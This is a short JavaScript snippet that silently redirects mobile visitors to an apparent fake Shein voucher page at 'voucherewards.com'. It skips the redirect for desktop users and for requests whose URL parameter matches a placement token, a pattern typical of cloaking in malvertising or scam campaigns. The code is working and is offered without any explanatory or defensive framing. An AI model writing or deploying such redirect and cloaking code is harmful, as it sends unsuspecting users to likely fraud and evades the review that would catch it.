const urlParams = new URLSearchParams(window.location.search);
const utmXXX = urlParams.get("xxx");
const s = urlParams.get("s");
const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
const lander = `https://voucherewards.com/shein`;
if (utmXXX === "__PLACEMENT__") { }
else if (isMobileDevice) { window.location.href = lander; } 
else { }
